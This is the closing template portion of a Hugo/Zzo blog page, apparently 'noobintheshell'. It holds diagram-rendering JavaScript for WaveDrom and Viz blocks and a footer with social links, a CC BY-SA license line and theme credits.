      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + wavePrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        var source = null;
        node0.id = 'WaveDrom_Display_' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        WaveDrom.RenderWaveForm(index, source, "WaveDrom_Display_");
        index += 1;
      });
    }
    



    
    if (lib && lib.includes('viz')) {
      var vizPrefix = "language-viz-";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        var engine;
        x.getAttribute("class").split(" ").forEach(function (cls) {
          if (cls.startsWith(vizPrefix)) {
            engine = cls.substr(vizPrefix.length);
          }
        });
        var viz = new Viz();
        viz.renderSVGElement(x.innerText, { engine: engine })
          .then(function (element) {
            element.style.width = "100%";
            x.parentNode.insertBefore(element, x);
          })
      });
    }
    
    
  }
</script>


            
            <footer class="footer">
    
    
<div class="footer__social">
  <div class="social">
    
            
    
            
    
            
    
      
      <a href="javascript:location.href%20=%20%27mailto:%27%20&#43;%20[%27noobintheshell%27,%27protonmail.com%27].join%28%27@%27%29" title="email" aria-label="email">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-.4 4.25l-7.07 4.42c-.32.2-.74.2-1.06 0L4.4 8.25c-.25-.16-.4-.43-.4-.72 0-.67.73-1.07 1.3-.72L12 11l6.7-4.19c.57-.35 1.3.05 1.3.72 0 .29-.15.56-.4.72z"/></svg>
      </a>
            
    
            
    
            
    
      
      <a href="https://github.com/noobintheshell" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
      
      <a href="https://twitter.com/noobintheshell_" title="twitter" aria-label="twitter">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 32 32" version="1.1">
<g id="surface676">
<path fill="currentColor" d="M 28 8.558594 C 27.117188 8.949219 26.167969 9.214844 25.171875 9.332031 C 26.1875 8.722656 26.96875 7.757812 27.335938 6.609375 C 26.386719 7.171875 25.332031 7.582031 24.210938 7.804688 C 23.3125 6.847656 22.03125 6.246094 20.617188 6.246094 C 17.898438 6.246094 15.691406 8.453125 15.691406 11.171875 C 15.691406 11.558594 15.734375 11.933594 15.820312 12.292969 C 11.726562 12.089844 8.097656 10.128906 5.671875 7.148438 C 5.246094 7.875 5.003906 8.722656 5.003906 9.625 C 5.003906 11.332031 5.871094 12.839844 7.195312 13.722656 C 6.386719 13.695312 5.628906 13.476562 4.964844 13.105469 C 4.964844 13.128906 4.964844 13.148438 4.964844 13.167969 C 4.964844 15.554688 6.660156 17.546875 8.914062 17.996094 C 8.5 18.109375 8.066406 18.171875 7.617188 18.171875 C 7.300781 18.171875 6.988281 18.140625 6.691406 18.082031 C 7.316406 20.039062 9.136719 21.460938 11.289062 21.503906 C 9.605469 22.824219 7.480469 23.609375 5.175781 23.609375 C 4.777344 23.609375 4.386719 23.585938 4 23.539062 C 6.179688 24.9375 8.765625 25.753906 11.546875 25.753906 C 20.605469 25.753906 25.558594 18.25 25.558594 11.742188 C 25.558594 11.53125 25.550781 11.316406 25.542969 11.105469 C 26.503906 10.410156 27.339844 9.542969 28 8.558594 Z M 28 8.558594 "/>
</g>
</svg>

      </a>
            
    
            
    
            
    
            
    
            
    
            
    
    
  
  
    
      <a href="https://noobintheshell.com/posts/index.xml" type="application/rss+xml" title="RSS" aria-label="RSS Feed Link">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><circle fill="currentColor" cx="6.18" cy="17.82" r="2.18"/><path fill="currentColor" d="M5.59 10.23c-.84-.14-1.59.55-1.59 1.4 0 .71.53 1.28 1.23 1.4 2.92.51 5.22 2.82 5.74 5.74.12.7.69 1.23 1.4 1.23.85 0 1.54-.75 1.41-1.59-.68-4.2-3.99-7.51-8.19-8.18zm-.03-5.71C4.73 4.43 4 5.1 4 5.93c0 .73.55 1.33 1.27 1.4 6.01.6 10.79 5.38 11.39 11.39.07.73.67 1.28 1.4 1.28.84 0 1.5-.73 1.42-1.56-.73-7.34-6.57-13.19-13.92-13.92z"/></svg>
      </a>
    
  


  </div>
</div>

    
<div id="gtt">
  <div class="gtt">
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M8.12 14.71L12 10.83l3.88 3.88c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L12.7 8.71c-.39-.39-1.02-.39-1.41 0L6.7 13.3c-.39.39-.39 1.02 0 1.41.39.38 1.03.39 1.42 0z"/></svg>
  </div>
</div>

    <hr />

    <div class="basicflex flexwrap">
        
            
        
            
        
    </div>

    <div class="footer__poweredby">
        
                
            <p class="caption">
                
                    
                    

                    
                        2021, Some Rights Reserved -<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA</a>
                    
                
            </p>
        

        
            <p class="caption">Powered by <a href="https://gohugo.io/" target="_blank" rel="noreferrer">Hugo</a> and the <a href="https://github.com/zzossig/hugo-theme-zzo" target="_blank" rel="noreferrer">Zzo theme</a></p>
        
        
    </div> 
</footer>
        </div>
        





<div class="wrapper__right hide" data-pad="true" dir="ltr">
  <script>document.querySelector('.wrapper__right').classList.remove('hide')</script>
  
</div>

    </div>
</body>

</html>